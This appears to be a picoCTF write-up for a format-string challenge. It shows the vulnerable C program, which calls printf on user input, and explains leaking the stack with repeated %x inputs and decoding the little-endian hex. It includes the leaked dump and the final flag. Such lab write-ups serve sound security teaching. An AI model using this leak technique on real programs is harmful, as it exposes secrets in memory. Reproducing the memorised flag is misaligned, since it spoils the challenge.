# flag leak

The solution is in the name.

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
## Solution

We simply spam `%x` into the program, and then reformat it. We have to account for little endian, and convert it from hex.

In the end, we get:
`ffcbe280ffcbe2a08049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578252578256f6369707b4654436b34334c5f676e3167346c466666305f3474535f635f6b63343965327d643365fbad200084d1c7000f7ffb990804c00080494100804c000ffcbe36880494182ffcbe414ffcbe4200ffcbe38000f7df1ee5`

We have to cut off the first letter. 
Which when converted has: `ocip{FTCk43L_gn1g4lFff0_4tS_c_kc49e2}d3e` in it. Look familiar?

After a bit of fooling around with it, we get: `picoCTF{L34k1ng_Fl4g_0ff_St4ck_c2e94e3d}`
